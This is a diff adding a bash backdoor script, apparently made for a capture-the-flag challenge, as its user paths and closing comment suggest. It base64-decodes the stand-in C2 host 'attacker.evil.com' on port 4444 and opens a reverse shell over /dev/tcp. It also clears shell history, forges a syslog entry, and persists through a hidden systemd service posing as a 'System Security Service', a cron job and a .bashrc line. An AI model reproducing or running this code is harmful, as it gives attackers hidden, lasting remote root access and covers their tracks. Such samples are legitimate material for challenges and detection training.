@@ -1,0 +1,66 @@
+// backdoor
+#!/bin/bash
+
+# Masquer le processus dans ps
+exec 2>/dev/null
+if [ "$(id -u)" -eq 0 ]; then
+    true  # Le script s'exécute déjà en tant que root
+else
+    exit 1
+fi
+
+# Fonction pour encoder en base64
+encode() {
+    echo "$1" | base64
+}
+
+# Fonction pour décoder depuis base64
+decode() {
+    echo "$1" | base64 -d
+}
+
+# Configuration encodée en base64
+C2_SERVER=$(decode "YXR0YWNrZXIuZXZpbC5jb20=")  # attacker.evil.com
+C2_PORT=$(decode "NDQ0NA==")  # 4444
+
+# Établir une connexion reverse shell cachée
+(bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1 &)
+
+# Masquer les traces
+history -c
+unset HISTFILE
+HISTSIZE=0
+
+# Créer de faux logs pour masquer l'activité
+echo "[$(date)] System backup completed successfully" >> /var/log/syslog
+
+# Persister via différentes méthodes
+# 1. Service systemd caché
+if [ ! -f "/etc/systemd/system/.hidden-service.service" ]; then
+    cat > "/etc/systemd/system/.hidden-service.service" << EOL
+[Unit]
+Description=System Security Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/home/ctfuser/.hidden/backdoor
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+EOL
+    systemctl enable .hidden-service
+    systemctl start .hidden-service
+fi
+
+# 2. Tâche cron alternative (au cas où la première est découverte)
+CRON_CMD="*/10 * * * * /home/ctfuser/.hidden/backdoor"
+(crontab -l 2>/dev/null | grep -v "backdoor"; echo "$CRON_CMD") | crontab -
+
+# 3. Fichier .bashrc modifié
+if ! grep -q "backdoor" /home/ctfuser/.bashrc; then
+    echo "(/home/ctfuser/.hidden/backdoor &)" >> /home/ctfuser/.bashrc
+fi
+
+# Note: Ces méthodes de persistance sont intentionnellement détectables pour le challenge
